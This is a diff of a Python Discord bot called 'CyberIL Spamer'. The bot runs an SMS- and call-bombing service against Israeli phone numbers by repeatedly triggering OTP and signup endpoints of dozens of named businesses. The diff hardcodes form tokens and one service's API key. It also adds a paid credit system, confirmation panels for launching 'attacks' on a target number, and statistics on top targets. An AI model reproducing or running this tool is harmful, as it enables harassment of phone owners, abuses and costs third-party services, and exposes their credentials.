-                headers_extra=json_headers("https://clocklb.ok2go.co.il", "https://clocklb.ok2go.co.il/", {"sec-fetch-site": "same-origin"}),
-                tag="ok2go"),
-            send_request(s, "POST", "https://api-endpoints.histadrut.org.il/signup/send_code",
-                json_data={"phone": raw},
-                headers_extra={"Content-Type": "application/json", "accept-encoding": "gzip, deflate", "origin": "https://signup.histadrut.org.il", "referer": "https://signup.histadrut.org.il/", "x-api-key": "480317067f32f2fd3de682472403468da507b8d023a531602274d17d727a9189", "sec-fetch-site": "same-site"},
-                tag="histadrut"),
-            send_request(s, "POST", "https://www.papajohns.co.il/_a/aff_otp_auth",
-                form=f"phone={raw}",
-                headers_extra={**form_headers("https://www.papajohns.co.il", "https://www.papajohns.co.il/"), "sec-fetch-site": "same-origin"},
-                tag="papajohns"),
-            send_request(s, "POST", "https://www.iburgerim.co.il/_a/aff_otp_auth",
-                form=f"phone={raw}",
-                headers_extra={**form_headers("https://www.iburgerim.co.il", "https://www.iburgerim.co.il/"), "sec-fetch-site": "same-origin"},
-                tag="iburgerim"),
-            send_request(s, "GET", f"https://www.americanlaser.co.il/wp-json/calc/v1/send-sms?phone={raw}",
-                headers_extra={"referer": "https://www.americanlaser.co.il/calc/", "sec-fetch-mode": "cors", "sec-fetch-site": "same-origin", "accept-encoding": "gzip, deflate"},
-                tag="americanlaser"),
-            send_request(s, "POST", f"https://wb0lovv2z8.execute-api.eu-west-1.amazonaws.com/prod/api/v1/getOrdersSiteData?otpPhone={raw}",
-                json_data={"id": sid, "domain": "5fc39fabffae5ac5a229cebb", "action": "generateOneTimer", "phoneNumber": raw},
-                headers_extra=json_headers("https://orders.beecommcloud.com", "https://orders.beecommcloud.com/", {"sec-fetch-site": "cross-site"}),
-                tag="beecomm"),
-            send_request(s, "POST", "https://xtra.co.il/apps/api/inforu/sms",
-                json_data={"phoneNumber": raw},
-                headers_extra={"Content-Type": "application/json", "accept-encoding": "gzip, deflate", "origin": "https://xtra.co.il", "referer": "https://xtra.co.il/pages/brand/cafe-cafe", "sec-fetch-site": "same-origin"},
-                tag="xtra"),
-            send_request(s, "POST", "https://www.lighting.co.il/customer/ajax/post/",
-                form=f"form_key=OoHXm6oGzca2WeJR&bot_validation=1&type=login&telephone={raw}&code=&compare_email=&compare_identity=",
-                headers_extra=form_headers("https://www.lighting.co.il", "https://www.lighting.co.il/"),
-                tag="lighting"),
-            send_request(s, "POST", "https://proxy1.citycar.co.il/api/verify/login",
-                json_data={"phoneNumber": formatted, "verifyChannel": 2, "loginOrRegister": 1},
-                headers_extra=json_headers("https://citycar.co.il", "https://citycar.co.il/", {"sec-fetch-site": "same-site"}),
-                tag="citycar"),
-            send_request(s, "POST", "https://www.lilit.co.il/customer/ajax/post/",
-                form=f"form_key=sXWXnRwFsKy5YX9E&bot_validation=1&type=login&telephone={raw}&code=&compare_email=&compare_identity=",
-                headers_extra=form_headers("https://www.lilit.co.il", "https://www.lilit.co.il/"),
-                tag="lilit"),
-            send_request(s, "POST", "https://www.castro.com/customer/ajax/post/",
-                form=f"bot_validation=1&type=login&telephone={raw}",
-                headers_extra=form_headers("https://www.castro.com", "https://www.castro.com/"),
-                tag="castro"),
-            send_request(s, "POST", "https://www.bathandbodyworks.co.il/customer/ajax/post/",
-                form=f"form_key=ckGbaafzIC4Yi2l8&bot_validation=1&type=login&telephone={raw}&code=&compare_email=&compare_identity=",
-                headers_extra=form_headers("https://www.bathandbodyworks.co.il", "https://www.bathandbodyworks.co.il/home"),
-                tag="bathandbody"),
-            send_request(s, "POST", "https://www.golbary.co.il/customer/ajax/post/",
-                form=f"form_key=w1deINjU3Ffpj8ct&bot_validation=1&type=login&telephone={raw}&code=&compare_email=&compare_identity=",
-                headers_extra=form_headers("https://www.golbary.co.il", "https://www.golbary.co.il/"),
-                tag="golbary"),
-            send_request(s, "POST", "https://api.getpackage.com/v1/graphql/",
-                json_data={"operationName": "sendCheckoutRegistrationCode", "variables": {"userName": raw}, "query": "mutation sendCheckoutRegistrationCode($userName: String!) { sendCheckoutRegistrationCode(userName: $userName) { status __typename } }"},
-                headers_extra=json_headers("https://www.getpackage.com", "https://www.getpackage.com/", {"sec-fetch-site": "same-site"}),
-                tag="getpackage"),
-            send_request(s, "POST", "https://ohmama.co.il/?wc-ajax=validate_user_by_sms",
-                form=f"otp_login_nonce=de90e8f67b&phone={raw}&security=de90e8f67b",
-                headers_extra={**form_headers("https://ohmama.co.il", "https://ohmama.co.il/"), "sec-fetch-site": "same-origin"},
-                tag="ohmama"),
-            send_request(s, "POST", "https://server.myofer.co.il/api/sendAuthSms",
-                json_data={"phoneNumber": raw},
-                headers_extra=json_headers("https://www.myofer.co.il", "https://www.myofer.co.il/", {"sec-fetch-site": "same-site", "x-app-version": "3.0.0"}),
-                tag="myofer"),
-            send_request(s, "POST", "https://arcaffe.co.il/wp-admin/admin-ajax.php",
+            send_request(s, "https://arcaffe.co.il/wp-admin/admin-ajax.php",
                 form=f"action=user_login_step_1&phone_number={raw}&step[]=1",
-                headers_extra=form_headers("https://arcaffe.co.il", "https://arcaffe.co.il/"),
                 tag="arcaffe"),
-            send_request(s, "POST", "https://api.noyhasade.co.il/api/login?origin=web",
-                json_data={"phone": raw, "email": False, "ip": "1.1.1.1"},
-                headers_extra=json_headers("https://www.noyhasade.co.il", "https://www.noyhasade.co.il/", {"sec-fetch-site": "same-site"}),
-                tag="noyhasade"),
-            send_request(s, "POST", "https://api.geteat.co.il/auth/sendValidationCode",
+            send_request(s, "https://api.geteat.co.il/auth/sendValidationCode",
                 data=geteat_fd,
-                headers_extra={"User-Agent": random_agent(), "accept-encoding": "gzip, deflate", "origin": "https://order.geteat.co.il", "referer": "https://order.geteat.co.il/", "sec-fetch-mode": "cors", "sec-fetch-site": "same-site"},
                 tag="geteat"),
         ] + atmos_club
 
@@ -727,32 +456,54 @@ async def run_all(phone: str):
 
         return success, failed
 
+# עיצוב פאנל משופר
 def create_panel():
     embed = discord.Embed(
-        title="CyberIL Spamer",
-        description=f"APP\n{datetime.now().strftime('%m/%d/%Y %I:%M %p')}",
+        title="🔥 **CYBERIL SPAMER** 🔥",
+        description="```diff\n+ מערכת ספאם אוטומטית מתקדמת\n+ שלח הודעות SMS ושיחות בו-זמנית\n+ מעל 50 שירותים שונים\n```",
         color=COLOR_MAIN
     )
     embed.add_field(
-        name="CyberIL System",
-        value="+ **Spam Panel**",
+        name="📊 **סטטוס מערכת**",
+        value="```✅ פעיל לחלוטין```",
         inline=False
     )
     embed.add_field(
-        name="Start Spamming Easily",
-        value="Click the button below to begin using the spam system.\n\n⚠️ Make sure you have enough coins before starting.",
+        name="🎯 **איך מתחילים?**",
+        value="```1. לחץ על הכפתור התחלת ספאם\n2. הזן מספר טלפון (05XXXXXXXX)\n3. בחר כמות קרדיטים (1-100)\n4. אשר והמתן לתוצאות```",
         inline=False
     )
-    embed.set_footer(text=f"CyberIL Spamer © 2026 • Spam System • {datetime.now().strftime('%m/%d/%Y %I:%M %p')}")
+    embed.add_field(
+        name="💎 **עלות**",
+        value=f"```כל קרדיט = {CREDITS_PER_CYCLE} סבבי ספאם\nכל סבב = כ-35 שניות```",
+        inline=False
+    )
+    embed.add_field(
+        name="⚠️ **הערות חשובות**",
+        value="```- קירור של 20 שניות בין ספאם לאותו מספר\n- ניתן להפסיק את הספאם בכל רגע\n- הקרדיטים נמחקים רק לאחר התחלת הספאם```",
+        inline=False
+    )
+    embed.set_thumbnail(url="https://cdn.discordapp.com/emojis/1345678901234567890.png")
+    embed.set_footer(text=f"CyberIL Spamer © 2026 • {datetime.now().strftime('%d/%m/%Y %H:%M')}", icon_url="https://cdn.discordapp.com/emojis/1345678901234567890.png")
     return embed
 
 def create_gift_panel():
     embed = discord.Embed(
-        title="CyberIL Spamer | Free Coins",
-        description="**Free Coins**\n\nGet 1 coin every 24 hours.\n\nClick the button below to claim your coin.",
+        title="🎁 **קרדיטים חינם** 🎁",
+        description="```diff\n+ קבל קרדיט אחד כל 24 שעות\n+ אין הגבלה על כמות הקרדיטים\n+ קרדיטים נצברים לאורך זמן```",
         color=0xFFD700
     )
-    embed.set_footer(text="CyberIL Spamer © 2026")
+    embed.add_field(
+        name="💰 **איך מקבלים?**",
+        value="```לחץ על הכפתור למטה וקבל קרדיט אחד מיידית!```",
+        inline=False
+    )
+    embed.add_field(
+        name="⏰ **מתי下一次?**",
+        value="```אתה יכול לקבל קרדיט נוסף לאחר 24 שעות```",
+        inline=False
+    )
+    embed.set_footer(text="CyberIL Spamer © 2026", icon_url="https://cdn.discordapp.com/emojis/1345678901234567890.png")
     return embed
 
 class StopAttack(discord.ui.View):
@@ -760,10 +511,10 @@ class StopAttack(discord.ui.View):
         super().__init__(timeout=600)
         self.user_id = user_id
 
-    @discord.ui.button(label="🛑 Stop Spam", style=discord.ButtonStyle.danger)
+    @discord.ui.button(label="🛑 עצור ספאם", style=discord.ButtonStyle.danger, emoji="🛑")
     async def stop_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
         if interaction.user.id != self.user_id and not is_admin(interaction):
-            await interaction.response.send_message("❌ Not your attack.", ephemeral=True)
+            await interaction.response.send_message("❌ לא הספאם שלך!", ephemeral=True)
             return
         ev = active_missions.get(self.user_id)
         if ev:
@@ -773,46 +524,45 @@ class StopAttack(discord.ui.View):
 
 class ConfirmAttack(discord.ui.View):
     def __init__(self, phone: str, rounds: int, cost: int, user_id: int):
-        super().__init__(timeout=30)
+        super().__init__(timeout=60)
         self.phone = phone
         self.rounds = rounds
         self.cost = cost
         self.user_id = user_id
 
-    @discord.ui.button(label="✅ Yes, launch", style=discord.ButtonStyle.danger)
+    @discord.ui.button(label="✅ כן, התחל ספאם", style=discord.ButtonStyle.danger, emoji="✅")
     async def confirm_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
         if interaction.user.id != self.user_id:
-            await interaction.response.send_message("❌ Not your confirmation.", ephemeral=True)
+            await interaction.response.send_message("❌ לא האישור שלך!", ephemeral=True)
             return
         self.stop()
 
-        try:
-            await interaction.response.defer()
-        except Exception:
-            return
+        # Defer first
+        await interaction.response.defer(ephemeral=True)
 
         for _ in range(self.cost):
             if not await use_credit(self.user_id):
-                await interaction.edit_original_response(embed=discord.Embed(title="❌ Not enough credits.", color=COLOR_DANGER), view=None)
+                await interaction.edit_original_response(embed=discord.Embed(title="❌ אין מספיק קרדיטים", description="רכש קרדיטים נוספים דרך החנויות", color=COLOR_DANGER), view=None)
                 return
 
         event = asyncio.Event()
         active_missions[self.user_id] = event
 
-        embed = discord.Embed(title="🚀 Spam In Progress", description=f"Spamming **{self.phone}** — ~{self.cost * 35}s", color=COLOR_WARNING)
-        embed.set_footer(text="Press Stop to abort.")
+        embed = discord.Embed(title="🚀 **ספאם בתהליך** 🚀", description=f"מספמם את **{self.phone}**\nזמן משוער: ~{self.cost * 35} שניות", color=COLOR_WARNING)
+        embed.add_field(name="💡 טיפ", value="לחץ על כפתור העצירה כדי להפסיק את הספאם", inline=False)
         await interaction.edit_original_response(embed=embed, view=StopAttack(self.user_id))
 
         total_success = 0
         total_failed = 0
 
         try:
-            for _ in range(self.rounds):
+            for i in range(self.rounds):
                 if event.is_set():
                     break
                 s, f = await run_all(self.phone)
                 total_success += s
                 total_failed += f
+                await asyncio.sleep(1)
 
             await apply_cooldown(self.phone)
             active_missions.pop(self.user_id, None)
@@ -829,34 +579,44 @@ class ConfirmAttack(discord.ui.View):
             )
 
             bal = await format_balance(self.user_id)
-            final = discord.Embed(title="🛑 Stopped" if stopped else "✅ Spam Complete", color=COLOR_INFO)
-            final.add_field(name="📱 Target", value=self.phone, inline=True)
-            final.add_field(name="⏱️ Duration", value=f"~{self.cost * 35}s", inline=True)
-            final.add_field(name="✅ Success", value=str(total_success), inline=True)
-            final.add_field(name="❌ Failed", value=str(total_failed), inline=True)
-            final.add_field(name="💰 Coins Left", value=bal, inline=True)
+            
+            if stopped:
+                final = discord.Embed(title="🛑 **ספאם הופסק** 🛑", color=COLOR_WARNING)
+            else:
+                final = discord.Embed(title="✅ **ספאם הושלם** ✅", color=COLOR_SUCCESS)
+            
+            final.add_field(name="📱 מספר יעד", value=self.phone, inline=True)
+            final.add_field(name="⏱️ משך זמן", value=f"~{self.cost * 35} שניות", inline=True)
+            final.add_field(name="✅ הצלחות", value=str(total_success), inline=True)
+            final.add_field(name="❌ כשלונות", value=str(total_failed), inline=True)
+            final.add_field(name="💰 קרדיטים נותרים", value=bal, inline=True)
+            
+            if total_success > 0:
+                final.set_footer(text=f"🔥 נשלחו {total_success} בקשות בהצלחה!")
+            
             await interaction.edit_original_response(embed=final, view=None)
 
         except Exception as e:
             active_missions.pop(self.user_id, None)
-            await interaction.edit_original_response(embed=discord.Embed(title="❌ Error", description=str(e)[:180], color=COLOR_DANGER), view=None)
+            error_embed = discord.Embed(title="❌ שגיאה", description=f"```{str(e)[:180]}```", color=COLOR_DANGER)
+            await interaction.edit_original_response(embed=error_embed, view=None)
 
-    @discord.ui.button(label="❌ Cancel", style=discord.ButtonStyle.secondary)
+    @discord.ui.button(label="❌ בטל", style=discord.ButtonStyle.secondary, emoji="❌")
     async def cancel_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
         if interaction.user.id != self.user_id:
-            await interaction.response.send_message("❌ Not yours.", ephemeral=True)
+            await interaction.response.send_message("❌ לא שלך!", ephemeral=True)
             return
         self.stop()
-        await interaction.response.edit_message(embed=discord.Embed(title="❌ Cancelled", description="No credits were deducted.", color=COLOR_INFO), view=None)
+        await interaction.response.edit_message(embed=discord.Embed(title="❌ בוטל", description="לא נוכו קרדיטים", color=COLOR_INFO), view=None)
 
-class LaunchModal(discord.ui.Modal, title="Start Spamming"):
-    phone = discord.ui.TextInput(label="Phone Number", placeholder="054XXXXXXX", min_length=10, max_length=10, style=discord.TextStyle.short)
-    credits = discord.ui.TextInput(label="Credits to use (max 100)", placeholder="e.g. 5", min_length=1, max_length=3, style=discord.TextStyle.short)
+class LaunchModal(discord.ui.Modal, title="🚀 התחל ספאם"):
+    phone = discord.ui.TextInput(label="📱 מספר טלפון", placeholder="לדוגמה: 0501234567", min_length=10, max_length=10, style=discord.TextStyle.short)
+    credits = discord.ui.TextInput(label="💎 כמות קרדיטים", placeholder="1-100", min_length=1, max_length=3, style=discord.TextStyle.short)
 
     async def on_submit(self, interaction: discord.Interaction):
         phone_num = self.phone.value.strip()
         if not re.match(r"^05[0-9]{8}$", phone_num):
-            await interaction.response.send_message("❌ Invalid number — must be **05XXXXXXXX**", ephemeral=True)
+            await interaction.response.send_message("❌ מספר לא תקין! חייב להיות 05XXXXXXXX", ephemeral=True)
             return
 
         try:
@@ -864,7 +624,7 @@ class LaunchModal(discord.ui.Modal, title="Start Spamming"):
             if credits_num < 1 or credits_num > MAX_CREDIT_SPEND:
                 raise ValueError
         except ValueError:
-            await interaction.response.send_message(f"❌ Must be 1–{MAX_CREDIT_SPEND}.", ephemeral=True)
+            await interaction.response.send_message(f"❌ כמות לא תקינה! חייב להיות בין 1 ל-{MAX_CREDIT_SPEND}", ephemeral=True)
             return
 
         uid = interaction.user.id
@@ -874,60 +634,86 @@ class LaunchModal(discord.ui.Modal, title="Start Spamming"):
         unlimited = await has_unlimited(uid)
 
         if bal < credits_num and not unlimited:
-            await interaction.response.send_message(f"❌ Need **{credits_num}** credits | you have **{bal}**", ephemeral=True)
+            await interaction.response.send_message(f"❌ חסרים לך קרדיטים! יש לך: **{bal}** צריך: **{credits_num}**", ephemeral=True)
             return
 
         on_cd, remain = await check_cooldown(phone_num)
         if on_cd:
-            await interaction.response.send_message(f"⏳ Number on cooldown — **{remain}s** left.", ephemeral=True)
+            await interaction.response.send_message(f"⏳ המספר נמצא בקירור! נשארו **{remain}** שניות", ephemeral=True)
             return
 
         bal_str = await format_balance(uid)
-        confirm = discord.Embed(title="⚠️ Confirm Spam", description=f"```\nTARGET  : {phone_num}\nDURATION: ~{credits_num * 35}s\nCOST    : {credits_num} credit(s)  |  Balance: {bal_str}\n```", color=COLOR_WARNING)
+        
+        confirm = discord.Embed(
+            title="⚠️ **אישור ספאם** ⚠️",
+            description=f"```\n🎯 יעד: {phone_num}\n⏱️ משך: ~{credits_num * 35} שניות\n💰 עלות: {credits_num} קרדיטים\n💎 יתרה: {bal_str}\n```",
+            color=COLOR_WARNING
+        )
+        confirm.set_footer(text="האם אתה בטוח שברצונך להתחיל?")
+        
         await interaction.response.send_message(embed=confirm, view=ConfirmAttack(phone=phone_num, rounds=total_rounds, cost=credits_num, user_id=uid), ephemeral=True)
 
 class MainPanel(discord.ui.View):
     def __init__(self):
         super().__init__(timeout=None)
 
-    @discord.ui.button(label="Start Spam", style=discord.ButtonStyle.danger, custom_id="start_spam")
+    @discord.ui.button(label="🚀 התחל ספאם", style=discord.ButtonStyle.danger, emoji="🚀", custom_id="start_spam")
     async def start_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
         now = time.time()
         last = cooldown_tracker.get(interaction.user.id, 0)
         if now - last < LAUNCH_DELAY:
             rem = int(LAUNCH_DELAY - (now - last))
-            await interaction.response.send_message(f"⏳ Cooldown — **{rem}s** left.", ephemeral=True)
+            await interaction.response.send_message(f"⏳ המתן **{rem}** שניות לפני התחלת ספאם חדש", ephemeral=True)
             return
         cooldown_tracker[interaction.user.id] = now
         await interaction.response.send_modal(LaunchModal())
 
-    @discord.ui.button(label="My Credits", style=discord.ButtonStyle.primary, custom_id="check_balance")
+    @discord.ui.button(label="💎 הקרדיטים שלי", style=discord.ButtonStyle.primary, emoji="💎", custom_id="check_balance")
     async def balance_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
         uid = interaction.user.id
         bal_str = await format_balance(uid)
         stats = await get_user_stats(uid)
 
-        embed = discord.Embed(title="💰 Your Balance", description=f"**{bal_str}** credits", color=COLOR_INFO)
+        embed = discord.Embed(title="💎 **הקרדיטים שלי**", description=f"יתרה נוכחית: **{bal_str}** קרדיטים", color=COLOR_INFO)
+        
         if stats:
-            embed.add_field(name="📊 Total Attacks", value=str(stats.get("total_attacks", 0)), inline=True)
-            embed.add_field(name="✅ Success", value=str(stats.get("total_success", 0)), inline=True)
-            embed.add_field(name="❌ Failed", value=str(stats.get("total_failed", 0)), inline=True)
-            embed.add_field(name="💎 Credits Used", value=str(stats.get("total_cost", 0)), inline=True)
+            embed.add_field(name="📊 סה\"כ מתקפות", value=str(stats.get("total_attacks", 0)), inline=True)
+            embed.add_field(name="✅ הצלחות", value=str(stats.get("total_success", 0)), inline=True)
+            embed.add_field(name="❌ כשלונות", value=str(stats.get("total_failed", 0)), inline=True)
+            embed.add_field(name="💎 קרדיטים בשימוש", value=str(stats.get("total_cost", 0)), inline=True)
+        
+        embed.set_footer(text="הקרדיטים מתחדשים כל 24 שעות דרך הפאנל החינמי")
 
         await interaction.response.send_message(embed=embed, ephemeral=True)
+
+    @discord.ui.button(label="📊 סטטיסטיקות", style=discord.ButtonStyle.secondary, emoji="📊", custom_id="stats")
+    async def stats_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
+        await interaction.response.defer(ephemeral=True)
+        stats = await get_global_stats()
+        
+        if not stats:
+            await interaction.followup.send("📭 אין נתונים עדיין", ephemeral=True)
+            return
+
+        embed = discord.Embed(title="📊 **סטטיסטיקות גלובליות**", color=COLOR_INFO)
+        embed.add_field(name="🎯 סה\"כ מתקפות", value=str(stats.get("total_attacks", 0)), inline=True)
+        embed.add_field(name="👥 משתמשים פעילים", value=str(stats.get("unique_users", 0)), inline=True)
+        embed.add_field(name="💎 קרדיטים בשימוש", value=str(stats.get("total_cost", 0)), inline=True)
+        embed.add_field(name="✅ סה\"כ הצלחות", value=str(stats.get("total_success", 0)), inline=True)
+        embed.add_field(name="❌ סה\"כ כשלונות", value=str(stats.get("total_failed", 0)), inline=True)
+        
+        await interaction.followup.send(embed=embed, ephemeral=True)
 
 class FreeCoins(discord.ui.View):
     def __init__(self):
         super().__init__(timeout=None)
 
-    @discord.ui.button(label="🔒 Claim Free Coin", style=discord.ButtonStyle.success, emoji="💎", custom_id="claim_free")
+    @discord.ui.button(label="🎁 קבל קרדיט חינם", style=discord.ButtonStyle.success, emoji="🎁", custom_id="claim_free")
     async def claim_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
         uid = interaction.user.id
         now = time.time()
-        try:
-            await interaction.response.defer(ephemeral=True)
-        except Exception:
-            return
+        
+        await interaction.response.defer(ephemeral=True)
 
         doc = await settings_collection.find_one({"_id": uid, "type": "free_credits"})
         if doc:
@@ -935,7 +721,11 @@ class FreeCoins(discord.ui.View):
             if diff < 86400:
                 hours = int((86400 - diff) // 3600)
                 minutes = int(((86400 - diff) % 3600) // 60)
-                embed = discord.Embed(title="⏳ Free Coins", description=f"You can claim your next coin in **{hours}h {minutes}m**", color=COLOR_WARNING)
+                embed = discord.Embed(
+                    title="⏳ **קרדיטים חינם**",
+                    description=f"תוכל לקבל קרדיט נוסף בעוד **{hours} שעות ו-{minutes} דקות**",
+                    color=COLOR_WARNING
+                )
                 await interaction.followup.send(embed=embed, ephemeral=True)
                 return
 
@@ -943,22 +733,79 @@ class FreeCoins(discord.ui.View):
         await settings_collection.update_one({"_id": uid, "type": "free_credits"}, {"$set": {"last_claim": now}}, upsert=True)
 
         new_bal = await format_balance(uid)
+        
         embed = discord.Embed(
-            title="💎 Free Coins",
-            description="**+1 Coin**\n\nGet 1 coin every 24 hours.\n\nClick the button below to claim your coin.",
+            title="🎉 **קיבלת קרדיט!** 🎉",
+            description=f"**+1 קרדיט**\n\nיתרה נוכחית: **{new_bal}** קרדיטים",
             color=0xFFD700
         )
-        embed.add_field(name="Current Balance", value=f"**{new_bal}** coins", inline=False)
+        embed.add_field(name="💡 טיפ", value="תוכל לקבל קרדיט נוסף בעוד 24 שעות", inline=False)
         embed.set_footer(text="CyberIL Spamer © 2026")
-        await interaction.followup.send(embed=embed, view=FreeCoins(), ephemeral=True)
+        
+        await interaction.followup.send(embed=embed, ephemeral=True)
+
+# פונקציות נוספות לסטטיסטיקה
+async def get_user_stats(user_id: int):
+    pipeline = [
+        {"$match": {"user_id": user_id}},
+        {"$group": {
+            "_id": "$user_id",
+            "total_attacks": {"$sum": 1},
+            "total_cost": {"$sum": "$cost"},
+            "total_success": {"$sum": "$success_count"},
+            "total_failed": {"$sum": "$failed_count"},
+            "total_requests": {"$sum": "$total"},
+            "last_attack": {"$max": "$timestamp"}
+        }}
+    ]
+    result = await logs_collection.aggregate(pipeline).to_list(1)
+    return result[0] if result else None
+
+async def get_global_stats():
+    pipeline = [
+        {"$group": {
+            "_id": None,
+            "total_attacks": {"$sum": 1},
+            "total_cost": {"$sum": "$cost"},
+            "total_success": {"$sum": "$success_count"},
+            "total_failed": {"$sum": "$failed_count"},
+            "total_requests": {"$sum": "$total"},
+            "unique_users": {"$addToSet": "$user_id"}
+        }}
+    ]
+    result = await logs_collection.aggregate(pipeline).to_list(1)
+    if result:
+        result[0]["unique_users"] = len(result[0]["unique_users"])
+        return result[0]
+    return None
+
+async def get_user_logs(user_id: int, limit: int = 20):
+    cursor = logs_collection.find({"user_id": user_id}).sort("timestamp", -1).limit(limit)
+    return await cursor.to_list(length=limit)
+
+async def get_all_logs(limit: int = 100):
+    cursor = logs_collection.find().sort("timestamp", -1).limit(limit)
+    return await cursor.to_list(length=limit)
+
+async def get_top_targets(limit: int = 10):
+    pipeline = [
+        {"$group": {
+            "_id": "$phone",
+            "count": {"$sum": 1},
+            "success_total": {"$sum": "$success_count"}
+        }},
+        {"$sort": {"count": -1}},
+        {"$limit": limit}
+    ]
+    return await logs_collection.aggregate(pipeline).to_list(length=limit)
 
 @client.event
 async def on_ready():
     client.add_view(MainPanel())
     client.add_view(FreeCoins())
     await tree.sync()
-    print(f"✅ CyberIL Spamer Online → {client.user}")
-    print(f"📡 Connected to {len(client.guilds)} servers")
+    print(f"✅ CyberIL Spamer פעיל → {client.user}")
+    print(f"📡 מחובר ל-{len(client.guilds)} שרתים")
 
     await asyncio.sleep(2)
 
@@ -967,182 +814,185 @@ async def on_ready():
         if main_ch:
             await main_ch.purge(limit=5)
             await main_ch.send(embed=create_panel(), view=MainPanel())
-            print(f"✅ Panel sent to {main_ch.name}")
+            print(f"✅ פאנל נשלח ל-{main_ch.name}")
         else:
-            print(f"❌ Channel not found: {PANEL_CHANNEL}")
+            print(f"❌ ערוץ לא נמצא: {PANEL_CHANNEL}")
 
         gift_ch = client.get_channel(GIFT_CHANNEL)
         if gift_ch:
             await gift_ch.purge(limit=5)
             await gift_ch.send(embed=create_gift_panel(), view=FreeCoins())
-            print(f"✅ Gift message sent to {gift_ch.name}")
+            print(f"✅ הודעת קרדיטים נשלחה ל-{gift_ch.name}")
         else:
-            print(f"❌ Channel not found: {GIFT_CHANNEL}")
+            print(f"❌ ערוץ לא נמצא: {GIFT_CHANNEL}")
 
     except Exception as e:
-        print(f"Error: {e}")
+        print(f"שגיאה: {e}")
 
-@tree.command(name="checkmycredit", description="Check your current balance")
-@app_commands.describe(member="User to check (leave empty for yourself)")
+# פקודות סלאש
+@tree.command(name="credit", description="בדוק את יתרת הקרדיטים שלך")
+async def cmd_credit(interaction: discord.Interaction):
+    await cmd_credits(interaction)
+
+@tree.command(name="credits", description="בדוק את יתרת הקרדיטים שלך")
+@app_commands.describe(member="משתמש לבדיקה (השאר ריק לעצמך)")
 async def cmd_credits(interaction: discord.Interaction, member: discord.Member = None):
     target = member or interaction.user
     bal = await format_balance(target.id)
     stats = await get_user_stats(target.id)
 
-    embed = discord.Embed(title="💰 Credits", description=f"{target.mention} — **{bal}** credits", color=COLOR_INFO)
+    embed = discord.Embed(title="💰 **קרדיטים**", description=f"{target.mention} — **{bal}** קרדיטים", color=COLOR_INFO)
     if stats:
-        embed.add_field(name="📊 Total Attacks", value=str(stats.get("total_attacks", 0)), inline=True)
-        embed.add_field(name="✅ Success", value=str(stats.get("total_success", 0)), inline=True)
-        embed.add_field(name="❌ Failed", value=str(stats.get("total_failed", 0)), inline=True)
+        embed.add_field(name="📊 מתקפות", value=str(stats.get("total_attacks", 0)), inline=True)
+        embed.add_field(name="✅ הצלחות", value=str(stats.get("total_success", 0)), inline=True)
+        embed.add_field(name="❌ כשלונות", value=str(stats.get("total_failed", 0)), inline=True)
 
     await interaction.response.send_message(embed=embed)
 
-@tree.command(name="addcredit", description="[ADMIN] Add credits to a user")
-@app_commands.describe(member="Target user", amount="Amount to add")
+@tree.command(name="addcredit", description="[ADMIN] הוסף קרדיטים למשתמש")
+@app_commands.describe(member="משתמש יעד", amount="כמות להוספה")
 async def cmd_addcredit(interaction: discord.Interaction, member: discord.Member, amount: int):
     if not is_admin(interaction):
-        await interaction.response.send_message("❌ Admins only.", ephemeral=True)
+        await interaction.response.send_message("❌ הרשאות חסרות", ephemeral=True)
         return
     if amount <= 0:
-        await interaction.response.send_message("❌ Must be positive.", ephemeral=True)
+        await interaction.response.send_message("❌ כמות חייבת להיות חיובית", ephemeral=True)
         return
     await add_credits(member.id, amount)
     new_bal = await format_balance(member.id)
-    embed = discord.Embed(title="✅ Credits Added", color=COLOR_SUCCESS)
-    embed.add_field(name="User", value=member.mention, inline=True)
-    embed.add_field(name="Added", value=str(amount), inline=True)
-    embed.add_field(name="Balance", value=new_bal, inline=True)
+    embed = discord.Embed(title="✅ קרדיטים נוספו", color=COLOR_SUCCESS)
+    embed.add_field(name="משתמש", value=member.mention, inline=True)
+    embed.add_field(name="נוסף", value=str(amount), inline=True)
+    embed.add_field(name="יתרה", value=new_bal, inline=True)
     await interaction.response.send_message(embed=embed)
 
-@tree.command(name="removecredit", description="[ADMIN] Remove credits from a user")
-@app_commands.describe(member="Target user", amount="Amount to remove")
+@tree.command(name="removecredit", description="[ADMIN] הסר קרדיטים ממשתמש")
+@app_commands.describe(member="משתמש יעד", amount="כמות להסרה")
 async def cmd_removecredit(interaction: discord.Interaction, member: discord.Member, amount: int):
     if not is_admin(interaction):
-        await interaction.response.send_message("❌ Admins only.", ephemeral=True)
+        await interaction.response.send_message("❌ הרשאות חסרות", ephemeral=True)
         return
     if amount <= 0:
-        await interaction.response.send_message("❌ Must be positive.", ephemeral=True)
+        await interaction.response.send_message("❌ כמות חייבת להיות חיובית", ephemeral=True)
         return
     await remove_credits(member.id, amount)
     new_bal = await format_balance(member.id)
-    embed = discord.Embed(title="🗑️ Credits Removed", color=COLOR_WARNING)
-    embed.add_field(name="User", value=member.mention, inline=True)
-    embed.add_field(name="Removed", value=str(amount), inline=True)
-    embed.add_field(name="Balance", value=new_bal, inline=True)
+    embed = discord.Embed(title="🗑️ קרדיטים הוסרו", color=COLOR_WARNING)
+    embed.add_field(name="משתמש", value=member.mention, inline=True)
+    embed.add_field(name="הוסר", value=str(amount), inline=True)
+    embed.add_field(name="יתרה", value=new_bal, inline=True)
     await interaction.response.send_message(embed=embed)
 
-@tree.command(name="lifetime", description="[ADMIN] Grant unlimited credits to a user")
-@app_commands.describe(member="Target user")
+@tree.command(name="lifetime", description="[ADMIN] הענק קרדיטים ללא הגבלה")
+@app_commands.describe(member="משתמש יעד")
 async def cmd_lifetime(interaction: discord.Interaction, member: discord.Member):
     if not is_admin(interaction):
-        await interaction.response.send_message("❌ Admins only.", ephemeral=True)
+        await interaction.response.send_message("❌ הרשאות חסרות", ephemeral=True)
         return
     await interaction.response.defer()
     await set_unlimited(member.id, True)
-    embed = discord.Embed(title="♾️ Lifetime Granted", description=f"{member.mention} now has **unlimited credits**.", color=COLOR_SUCCESS)
+    embed = discord.Embed(title="♾️ Lifetime הוענק", description=f"{member.mention} קיבל קרדיטים ללא הגבלה", color=COLOR_SUCCESS)
     await interaction.followup.send(embed=embed)
 
-@tree.command(name="removelifetime", description="[ADMIN] Remove lifetime from a user")
